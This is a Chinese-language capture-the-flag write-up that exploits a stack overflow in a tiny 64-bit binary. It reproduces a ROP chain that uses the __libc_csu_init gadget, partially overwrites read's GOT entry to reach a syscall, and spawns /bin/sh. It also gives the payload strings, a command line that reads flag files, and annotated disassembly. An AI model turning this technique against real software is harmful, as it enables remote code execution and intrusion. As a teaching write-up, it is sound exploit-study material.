# 漏洞点
如下所示，明显的缓冲区溢出漏洞，且got表里没有可利用的其他函数！！无法泄露地址！！oh my gad！
```
ssize_t __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf; // [rsp+0h] [rbp-10h]@1

  return read(0, &buf, 0x20uLL);
}
```

# 漏洞的利用
&#8195;分析上述的漏洞可以看出，这里只能写入0x20个字节，也就是只能覆盖ebp和esp，因此在栈中构造rop链是不可能的，所以考虑向bss段写入数据，在bss段构造rop<br>
<br>
&#8195;参见大佬的rop链如下，这里主要分析为什么要这么构造rop链
```
rop = p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
rop += p64(0x0) #rbx
rop += p64(0x1) #rbp
rop += p64(read_got) #r12
rop += p64(0x3b) #r13
rop += p64(read_got - 0x3a) #r14
rop += p64(0x0) #r15
rop += p64(0x400570) #ret
rop += p64(0x41414141)

rop += p64(0x0) #rbx
rop += p64(0x1) #rbp
rop += p64(read_got) #r12
rop += p64(0x600e00) #r13
rop += p64(0x600e00) #r14
rop += p64(read_got - 0x3a) #r15
rop += p64(0x400570) #ret
```
1、rop在一开始使用了一个gadget将构造的数据存储到寄存器中
2、这里需要关注ret的地址，观察这些寄存器的使用方式，在IDA pro中查看0x400570处的指令如下，为init函数的一部分。该部分代码的操作如下：
（1）将r13、r14、r15的值分别赋给了rdx、rsi、edi
（2）call  [r12+rbx*8] 的操作即为 call read_got，这也说明了为什么在构造参数的时候需要将r12赋值为read_got，rbx赋值为0，同时read的参数被赋值为0、read_got - 0x3a、0x3b，即调用read（0，read_got - 0x3a，0x3b），此函数的返回值为0x3b存储在eax中（这里设置为0x3b主要是因为execve（）的系统调用号为0x3b）。此时在调用read函数，传入的payload如下所示，该payload将“/bin/sh”参数写入了read_got-0x3a处，同时将read_got的最后一个字节改为了0xee（这里进行的这一波骚操作，主要是利用read函数比较短，syscall距离read函数的起始地址也比较短，遍历最后一个字节，应该就可以找到call syscall的地址，于是就将read_got修改为这一地址，并将eax赋值为execve的调用号）

```
payload = '/bin/sh'.ljust(0x3a, '\x00') + '\xee'
```
 
（3）为了绕过后续jnz的跳转，这里将ebp赋值为了1
（4）add rsp，8 于是在rop链后跟随了8个字节的‘a’
（5）这堆gadget，进行了一波同样的操作，这里由于在调用read_got时直接相当于call execve，因此只需要给第一个参数edi赋值为“/bin/sh”的地址即可，剩下两个参数可以随便赋值，然后再传送一波命令行参数的payload即可获取flag
```
payload1 = 'ls /home; ls /home/*; cat /home/readable/flag; cat /flag;\n'
```

```
.text:0000000000400570 loc_400570:                             ; CODE XREF: init+54j
.text:0000000000400570                 mov     rdx, r13
.text:0000000000400573                 mov     rsi, r14
.text:0000000000400576                 mov     edi, r15d
.text:0000000000400579                 call    qword ptr [r12+rbx*8]
.text:000000000040057D                 add     rbx, 1
.text:0000000000400581                 cmp     rbx, rbp
.text:0000000000400584                 jnz     short loc_400570
.text:0000000000400586
.text:0000000000400586 loc_400586:                             ; CODE XREF: init+36j
.text:0000000000400586                 add     rsp, 8
.text:000000000040058A                 pop     rbx
.text:000000000040058B                 pop     rbp
.text:000000000040058C                 pop     r12
.text:000000000040058E                 pop     r13
.text:0000000000400590                 pop     r14
.text:0000000000400592                 pop     r15
.text:0000000000400594                 retn
.text:0000000000400594 init            endp
```

# get到点
1、第一次学到利用init函数里的代码来实现相应的操作
2、这里采用暴力的方式，破解出call syscall的地址，同时又巧妙的将eax设置为了0x3b
3、由于此题一次只能写入0x20，而且根据程序的执行逻辑，一次写入的有效数据是0x10，因此需要通过循环来写入数据。同时通过另一个bss缓冲区来作为跳转，实现程序的正常功能
